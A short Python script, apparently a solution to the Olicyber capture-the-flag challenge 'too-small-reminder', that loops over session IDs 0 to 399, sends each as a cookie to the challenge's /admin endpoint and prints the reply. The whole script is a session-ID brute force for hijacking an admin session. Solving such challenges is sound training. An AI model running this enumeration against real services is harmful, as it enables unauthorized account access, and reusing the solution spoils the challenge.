import requests

# api-endpoint
URL = "http://too-small-reminder.challs.olicyber.it/admin"



# sending get request and saving the response as response object
for i in range(0,400):
    r = requests.get(url = URL, cookies={'session_id': f'{i}'}, )
    print(f'{r.json()['messaggio']}, id={i}')
 
# extracting data in json format
#data = r.json()
 